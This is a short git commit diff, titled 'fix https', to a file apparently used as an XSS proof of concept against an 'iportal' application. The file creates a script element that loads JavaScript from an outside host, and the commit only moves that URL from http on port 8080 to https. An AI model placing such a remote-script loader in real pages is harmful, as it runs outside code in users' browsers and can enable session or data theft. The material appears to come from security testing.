ea0fd9f13e946fb727919c84b04999c972526199
Hank_Chao <hank@gpiotek.com>
2025-12-19 08:48:17 +0800

    fix https

--- public/unencode_iportal_xss.js
+++ public/unencode_iportal_xss.js
@@ -1,3 +1,3 @@
 var script = document.createElement('script');
-script.src = "http://website.neohank.com:8080/hank/poc_test/iportal_xss/now_poc.js";
+script.src = "https://website.neohank.com/hank/poc_test/iportal_xss/now_poc.js";
 document.head.appendChild(script);
